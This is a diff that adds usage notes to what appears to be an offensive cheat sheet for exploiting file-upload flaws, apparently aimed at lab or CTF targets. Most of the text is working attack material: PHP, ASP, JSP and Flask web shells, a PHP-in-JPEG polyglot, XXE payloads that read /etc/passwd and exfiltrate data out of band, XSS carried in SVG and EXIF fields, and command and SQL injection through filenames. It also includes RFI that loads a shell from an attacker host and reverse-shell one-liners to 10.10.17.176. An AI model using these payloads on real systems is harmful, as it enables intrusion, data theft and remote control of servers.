@@ -11,6 +11,7 @@ curl -sk "http://TARGET/" | grep -iE 'enctype|type="file"|accept='
 # Check what client-side restricts (UX hint, not security)
 # Inspect form: action= endpoint, name= field name, accept= types
 ```
+> Scans the page for file upload forms. Look at `action=` for the upload endpoint and `name=` for the field name to use in curl `-F`.
 
 ---
 
@@ -39,19 +40,23 @@ curl -sk "http://TARGET/" | grep -iE 'enctype|type="file"|accept='
 <?php echo shell_exec($_GET['c']); ?>
 <?php echo `{$_GET['c']}`; ?>
 ```
+> `$_REQUEST` catches both GET and POST. If `system()` is blocked by `disable_functions`, try the alternates in order.
 
 ```asp
 <% eval request('cmd') %>
 ```
+> One-liner web shell for classic ASP. Works on older IIS servers (Windows).
 
 ```jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
+> Java Server Pages (JSP) web shell for Apache Tomcat targets.
 
 ```python
 # Flask
 __import__('os').system(request.args.get('cmd'))
 ```
+> Flask/Python web shell. Use when the app is Python-based and accepts `.py` templates.
 
 ---
 
@@ -73,6 +78,7 @@ printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff
 
 file poly.jpg   # confirm MIME = image/*
 ```
+> Creates a polyglot file — image magic bytes followed by PHP code. `file` confirms it reads as an image. PHP ignores the header bytes and executes the `<?php` block.
 
 ---
 
@@ -102,6 +108,7 @@ for d in uploads upload files images media profile_images avatars; do
   curl -sk -o /dev/null -w "%{http_code} /$d/\n" "http://TARGET/$d/"
 done
 ```
+> Probes common upload storage directories. A 200 or 403 means the directory exists. A 404 means it doesn't.
 
 ---
 
@@ -113,6 +120,7 @@ done
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
 ```
+> Reads a local file via XML External Entity (XXE) injection. The server parses the SVG, resolves `&xxe;` to the file contents, and returns it in the rendered output.
 
 ### XXE — PHP Source Disclosure
 ```xml
@@ -120,6 +128,7 @@ done
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
 <svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
 ```
+> Reads PHP source code as base64 so it survives XML parsing. Decode the output with `base64 -d` to see the raw PHP.
 
 ### Stored XSS via SVG
 ```xml
@@ -127,6 +136,7 @@ done
   <script>alert(document.cookie)</script>
 </svg>
 ```
+> Delivers stored cross-site scripting (XSS) via SVG upload. Any user who views the SVG in the browser runs the script in the site's origin.
 
 ### Out-of-Band XXE (when not reflected)
 ```xml
@@ -138,6 +148,7 @@ done
 ]>
 <svg xmlns="http://www.w3.org/2000/svg">&exfil;</svg>
 ```
+> Out-of-band XXE exfiltrates data to your server when the response doesn't show the entity value directly. Requires an `evil.dtd` file hosted on your attacker machine.
 
 ---
 
@@ -147,6 +158,7 @@ done
 exiftool -Comment='"><img src=1 onerror=alert(document.cookie)>' photo.jpg
 exiftool -Artist='<script>alert(1)</script>' photo.jpg
 ```
+> Embeds a cross-site scripting (XSS) payload into the image metadata. Fires when any page renders the Comment or Artist field in HTML without escaping it.
 
 Fires when the metadata is rendered on a viewer page.
 
@@ -174,6 +186,7 @@ file';SELECT+SLEEP(5);--.jpg
 CON.jpg  NUL.png  PRN.jpg
 LPT1.gif COM1.png
 ```
+> These payloads target servers that use the filename unsafely — in shell commands, SQL queries, or HTML output. Pick based on what the server does with the name after upload.
 
 ---
 
@@ -191,6 +204,7 @@ curl "http://TARGET/?p=http://ATTACKER:8888/shell.php&c=id"
 impacket-smbserver -smb2support share /tmp
 curl "http://TARGET/?p=\\\\ATTACKER\\share\\shell.php"
 ```
+> Hosts a shell on your machine and uses a Remote File Inclusion (RFI) bug to load it into the target. SMB works on Windows even without `allow_url_include` enabled.
 
 ---
 
@@ -209,6 +223,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.176 LPORT=4444 -f aspx 
 # Listener
 nc -lvnp 4444    # or rlwrap nc / pwncat-cs
 ```
+> Generates language-specific reverse shells. Replace `10.10.17.176` with your tun0 IP. The `nc -lvnp` listener must be running before you trigger the upload.
 
 ---
 
@@ -224,6 +239,7 @@ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.17.176",444
 # nc without -e
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.17.176 4444 >/tmp/f
 ```
+> Pass these as the `cmd=` value to a web shell. URL-encode them first with `--data-urlencode` in curl. The netcat (nc) named-pipe version works when nc lacks the `-e` flag.
 
 ---
 
